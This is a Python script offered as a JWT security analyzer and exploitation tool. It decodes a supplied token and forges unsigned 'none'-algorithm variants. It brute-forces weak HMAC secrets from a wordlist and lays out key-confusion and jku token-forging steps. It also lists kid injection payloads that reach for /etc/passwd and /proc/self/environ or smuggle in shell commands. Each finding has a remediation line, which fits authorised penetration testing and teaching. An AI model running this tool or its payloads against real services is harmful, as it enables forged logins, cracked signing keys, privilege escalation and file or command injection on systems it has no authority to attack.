#!/usr/bin/env python3
"""
JWT (JSON Web Token) Security Analyzer
Advanced JWT exploitation and security testing tool
"""

import base64
import json
import hmac
import hashlib
import argparse
import requests
from typing import Dict, List, Tuple
from datetime import datetime
import itertools

class JWTAnalyzer:
    """Advanced JWT security analyzer and exploit tool"""
    
    # Common weak secrets for brute force
    COMMON_SECRETS = [
        'secret', 'password', 'key', '123456', 'admin', 'test', 'default',
        'changeme', 'secret123', 'secretkey', 'jwt', 'token', 'auth',
        'password123', 'admin123', 'mySecret', 'supersecret', '12345678',
        'qwerty', 'abc123', 'password1', 'secret1', 'secretpassword'
    ]
    
    def __init__(self, token: str, verbose: bool = False):
        self.token = token
        self.verbose = verbose
        self.vulnerabilities: List[Dict] = []
        
    def decode_token(self) -> Tuple[Dict, Dict, str]:
        """Decode JWT without verification"""
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")
            
            # Decode header
            header = json.loads(self._decode_base64(parts[0]))
            
            # Decode payload
            payload = json.loads(self._decode_base64(parts[1]))
            
            # Signature (keep as is)
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {e}")
    
    def _decode_base64(self, data: str) -> str:
        """Decode base64 with padding"""
        # Add padding if needed
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode('utf-8')
    
    def _encode_base64(self, data: str) -> str:
        """Encode to base64 URL-safe without padding"""
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')
    
    def test_none_algorithm(self) -> Dict:
        """Test 'none' algorithm vulnerability (CVE-2015-9235)"""
        print("[*] Testing 'none' algorithm attack...")
        
        try:
            header, payload, _ = self.decode_token()
            
            # Modify header to use 'none' algorithm
            header['alg'] = 'none'
            
            # Create new token with no signature
            new_header = self._encode_base64(json.dumps(header, separators=(',', ':')))
            new_payload = self._encode_base64(json.dumps(payload, separators=(',', ':')))
            
            # Variations of 'none' algorithm tokens
            variations = [
                f"{new_header}.{new_payload}.",       # Empty signature
                f"{new_header}.{new_payload}",        # No signature section
            ]
            
            header_lower = header.copy()
            header_lower['alg'] = 'None'
            new_header_lower = self._encode_base64(json.dumps(header_lower, separators=(',', ':')))
            variations.append(f"{new_header_lower}.{new_payload}.")
            
            header_upper = header.copy()
            header_upper['alg'] = 'NONE'
            new_header_upper = self._encode_base64(json.dumps(header_upper, separators=(',', ':')))
            variations.append(f"{new_header_upper}.{new_payload}.")
            
            vuln = {
                'type': 'none_algorithm',
                'severity': 'CRITICAL',
                'description': 'JWT accepts "none" algorithm - signature verification bypassed',
                'exploitation': 'Can forge any JWT token without knowing the secret',
                'forged_tokens': variations,
                'remediation': 'Never accept "none" algorithm. Always verify signatures.'
            }
            
            print("    [!] Generated 'none' algorithm tokens for testing")
            self.vulnerabilities.append(vuln)
            return vuln
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] None algorithm test failed: {e}")
            return None
    
    def test_weak_secret(self, wordlist: List[str] = None) -> Dict:
        """Brute force weak HMAC secrets"""
        print("[*] Testing for weak HMAC secret...")
        
        try:
            header, payload, signature = self.decode_token()
            
            # Only works for HMAC algorithms
            if 'alg' not in header or not header['alg'].startswith('HS'):
                print("    [*] Token doesn't use HMAC algorithm, skipping")
                return None
            
            algorithm = header['alg']
            hash_func = {
                'HS256': hashlib.sha256,
                'HS384': hashlib.sha384,
                'HS512': hashlib.sha512
            }.get(algorithm)
            
            if not hash_func:
                return None
            
            # Try common secrets
            secrets_to_test = wordlist if wordlist else self.COMMON_SECRETS
            parts = self.token.rsplit('.', 1)
            message = parts[0].encode()
            
            print(f"    [*] Trying {len(secrets_to_test)} secrets...")
            
            for secret in secrets_to_test:
                # Calculate HMAC
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message, hash_func).digest()
                ).decode().rstrip('=')
                
                if sig == signature:
                    vuln = {
                        'type': 'weak_secret',
                        'severity': 'CRITICAL',
                        'description': f'JWT uses weak HMAC secret: {secret}',
                        'secret': secret,
                        'algorithm': algorithm,
                        'exploitation': 'Can forge any JWT token with this secret',
                        'remediation': 'Use strong, random secrets (at least 256 bits)'
                    }
                    print(f"    [!] FOUND WEAK SECRET: {secret}")
                    self.vulnerabilities.append(vuln)
                    return vuln
            
            print("    [+] No weak secret found in wordlist")
            return None
            
        except Exception as e:
            if self.verbose:
                print(f"    [!] Weak secret test error: {e}")
            return None
    
    def test_key_confusion(self) -> Dict:
        """Test RS256 to HS256 key confusion (CVE-2016-5431)"""
        print("[*] Testing key confusion attack (RS256 → HS256)...")
        
        try:
            header, payload, _ = self.decode_token()
            
            if header.get('alg') != 'RS256':
                print("    [*] Token doesn't use RS256, skipping")
                return None
            
            # Change algorithm to HS256
            header['alg'] = 'HS256'
            
            vuln = {
                'type': 'key_confusion',
                'severity': 'CRITICAL',
                'description': 'Potential RS256 to HS256 key confusion vulnerability',
                'exploitation': 'If server uses RSA public key as HMAC secret, can forge tokens',
                'modified_header': header,
                'attack_steps': [
                    '1. Get RSA public key from server',
                    '2. Change algorithm to HS256',
                    '3. Sign token using public key as HMAC secret',
                    '4. Server may verify using public key as HMAC secret'
                ],
                'remediation': 'Explicitly validate algorithm. Never use asymmetric public key for HMAC'
            }
            
            print("    [!] Token uses RS256 - vulnerable to key confusion if misconfigured")
            self.vulnerabilities.append(vuln)
            return vuln
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] Key confusion test failed: {e}")
            return None
    
    def test_kid_injection(self) -> Dict:
        """Test 'kid' (Key ID) header injection"""
        print("[*] Testing 'kid' header injection...")
        
        try:
            header, payload, _ = self.decode_token()
            
            # Test various kid injection payloads
            injection_payloads = [
                '/dev/null',                    # Null byte file
                '../../../dev/null',            # Path traversal
                '../../../../etc/passwd',       # File disclosure
                'key.txt',                      # Arbitrary file
                '/proc/self/environ',           # Environment variables
                '| whoami',                     # Command injection
                '; whoami;',                    # Command injection
                '../../../../../../dev/null',  # Deep path traversal
            ]
            
            vuln = {
                'type': 'kid_injection',
                'severity': 'HIGH',
                'description': 'JWT header contains "kid" - potential injection point',
                'current_kid': header.get('kid', 'Not present'),
                'injection_payloads': injection_payloads,
                'exploitation': 'Can manipulate key file path or inject commands',
                'remediation': 'Validate kid parameter, use whitelist, avoid direct file operations'
            }
            
            if 'kid' in header:
                print(f"    [!] Found 'kid' header: {header['kid']}")
                print(f"    [*] Try injecting: {injection_payloads[0]}")
                self.vulnerabilities.append(vuln)
                return vuln
            else:
                print("    [*] No 'kid' header found")
                return None
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] Kid injection test failed: {e}")
            return None
    
    def test_jku_injection(self) -> Dict:
        """Test 'jku' (JWK Set URL) header injection"""
        print("[*] Testing 'jku' header injection...")
        
        try:
            header, payload, _ = self.decode_token()
            
            if 'jku' in header:
                vuln = {
                    'type': 'jku_injection',
                    'severity': 'CRITICAL',
                    'description': 'JWT header contains "jku" (JWK Set URL)',
                    'current_jku': header['jku'],
                    'exploitation': 'Can point to attacker-controlled JWK set to forge tokens',
                    'attack_steps': [
                        '1. Host malicious JWK set on attacker server',
                        '2. Generate key pair and create JWK',
                        '3. Sign token with private key',
                        '4. Set jku to attacker URL',
                        '5. Server fetches attacker JWK and validates with it'
                    ],
                    'remediation': 'Never trust jku header. Use hardcoded key sources only'
                }
                
                print(f"    [!] CRITICAL: Found 'jku' header: {header['jku']}")
                self.vulnerabilities.append(vuln)
                return vuln
            else:
                print("    [*] No 'jku' header found")
                return None
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] JKU injection test failed: {e}")
            return None
    
    def test_claim_manipulation(self) -> Dict:
        """Test payload claim manipulation"""
        print("[*] Testing claim manipulation...")
        
        try:
            header, payload, _ = self.decode_token()
            
            dangerous_claims = []
            
            # Check for admin/role claims
            if 'admin' in payload:
                dangerous_claims.append({
                    'claim': 'admin',
                    'current': payload['admin'],
                    'attack': 'Change to true'
                })
            
            if 'role' in payload:
                dangerous_claims.append({
                    'claim': 'role',
                    'current': payload['role'],
                    'attack': 'Change to "admin"'
                })
            
            if 'isAdmin' in payload:
                dangerous_claims.append({
                    'claim': 'isAdmin',
                    'current': payload['isAdmin'],
                    'attack': 'Change to true'
                })
            
            # Check for user ID
            if 'user_id' in payload or 'userId' in payload or 'sub' in payload:
                dangerous_claims.append({
                    'claim': 'user_id/sub',
                    'current': payload.get('user_id') or payload.get('userId') or payload.get('sub'),
                    'attack': 'Change to another user ID'
                })
            
            if dangerous_claims:
                vuln = {
                    'type': 'claim_manipulation',
                    'severity': 'HIGH',
                    'description': 'JWT contains security-sensitive claims',
                    'dangerous_claims': dangerous_claims,
                    'exploitation': 'If signature not properly verified, can escalate privileges',
                    'remediation': 'Always verify signature. Use authorization checks on server side'
                }
                
                print(f"    [!] Found {len(dangerous_claims)} security-sensitive claims")
                self.vulnerabilities.append(vuln)
                return vuln
            else:
                print("    [*] No obvious dangerous claims found")
                return None
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] Claim manipulation test failed: {e}")
            return None
    
    def test_expiration(self) -> Dict:
        """Check expiration claims"""
        print("[*] Checking expiration...")
        
        try:
            header, payload, _ = self.decode_token()
            
            issues = []
            
            # Check exp claim
            if 'exp' not in payload:
                issues.append("No expiration (exp) claim - token never expires")
            else:
                exp = payload['exp']
                now = datetime.now().timestamp()
                if exp < now:
                    issues.append(f"Token is expired (exp: {exp})")
                elif exp - now > 86400 * 365:  # > 1 year
                    issues.append(f"Token expires in over 1 year (too long)")
            
            # Check nbf claim
            if 'nbf' in payload:
                nbf = payload['nbf']
                now = datetime.now().timestamp()
                if nbf > now:
                    issues.append(f"Token not yet valid (nbf: {nbf})")
            
            # Check iat claim
            if 'iat' not in payload:
                issues.append("No issued-at (iat) claim")
            
            if issues:
                vuln = {
                    'type': 'expiration_issues',
                    'severity': 'MEDIUM',
                    'description': 'JWT expiration/timing issues detected',
                    'issues': issues,
                    'current_claims': {k: v for k, v in payload.items() if k in ['exp', 'nbf', 'iat']},
                    'remediation': 'Set appropriate expiration times, include iat and exp claims'
                }
                
                print(f"    [!] Found {len(issues)} timing issues")
                self.vulnerabilities.append(vuln)
                return vuln
            else:
                print("    [+] Expiration claims look good")
                return None
            
        except Exception as e:
            if self.verbose:
                print(f"    [*] Expiration test failed: {e}")
            return None
    
    def analyze(self, wordlist: List[str] = None) -> Dict:
        """Run complete JWT security analysis"""
        print("="*60)
        print("JWT SECURITY ANALYZER")
        print("="*60)
        print(f"Token: {self.token[:50]}...\n")
        
        # Decode token
        try:
            header, payload, signature = self.decode_token()
            
            print("[+] Token decoded successfully")
            print(f"    Algorithm: {header.get('alg', 'Unknown')}")
            print(f"    Type: {header.get('typ', 'Unknown')}")
            if 'kid' in header:
                print(f"    Key ID: {header['kid']}")
            print()
            
        except Exception as e:
            print(f"[!] Failed to decode token: {e}")
            return None
        
        # Run all tests
        self.test_none_algorithm()
        self.test_weak_secret(wordlist)
        self.test_key_confusion()
        self.test_kid_injection()
        self.test_jku_injection()
        self.test_claim_manipulation()
        self.test_expiration()
        
        return self.generate_report()
    
    def generate_report(self) -> Dict:
        """Generate analysis report"""
        report = {
            'token': self.token[:50] + '...',
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
            'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
            'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
            'vulnerabilities': self.vulnerabilities
        }
        
        print("\n" + "="*60)
        print("JWT ANALYSIS SUMMARY")
        print("="*60)
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"  Critical: {report['critical']}")
        print(f"  High: {report['high']}")
        print(f"  Medium: {report['medium']}")
        
        if self.vulnerabilities:
            print("\n[!] VULNERABILITIES DETECTED:")
            for vuln in self.vulnerabilities:
                print(f"\n  Type: {vuln['type']}")
                print(f"  Severity: {vuln['severity']}")
                print(f"  Description: {vuln['description']}")
        else:
            print("\n[+] No critical vulnerabilities detected")
        
        print("\n" + "="*60)
        
        return report


def main():
    parser = argparse.ArgumentParser(
        description='JWT (JSON Web Token) Security Analyzer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_analyzer.py "eyJhbGc..."
  python jwt_analyzer.py "eyJhbGc..." -w secrets.txt
  python jwt_analyzer.py "eyJhbGc..." -o report.json
        """
    )
    
    parser.add_argument('token', help='JWT token to analyze')
    parser.add_argument('-w', '--wordlist', help='Wordlist file for secret brute-force')
    parser.add_argument('-o', '--output', help='Output report file (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Load wordlist if provided
    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(wordlist)} secrets from wordlist\n")
        except Exception as e:
            print(f"[!] Error loading wordlist: {e}\n")
    
    # Create analyzer
    analyzer = JWTAnalyzer(args.token, args.verbose)
    
    # Run analysis
    report = analyzer.analyze(wordlist)
    
    # Save report
    if args.output and report:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Report saved to: {args.output}")


if __name__ == "__main__":
    main()
